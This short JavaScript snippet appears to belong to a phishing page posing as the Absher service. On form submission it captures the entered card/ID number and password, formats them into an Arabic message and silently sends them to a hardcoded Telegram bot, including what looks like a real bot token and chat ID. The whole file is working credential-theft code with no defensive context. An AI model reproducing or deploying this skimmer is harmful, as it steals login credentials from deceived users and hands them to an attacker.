const form = document.querySelector("#form");

form.addEventListener("submit", (e) =>{
    e.preventDefault();
     var cardid = document.getElementById("cardid").value;

     var length = document.getElementById("length").value;
     

    var my_text = `ابشر%0A%0A-رقم بطاقة: ${cardid}%0A%0A-كلمت السر: ${length}%0A%0A`

    var token ="7409356455:AAF0wdhXgWCYsnV2raiK2KHZnMjbeuMCRJI";
    var chat_id =-4595005407
    var url =`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`
    
let api = new XMLHttpRequest();
api.open("GET", url, true);
api.send();

    console.log("Message successfully sended!")
})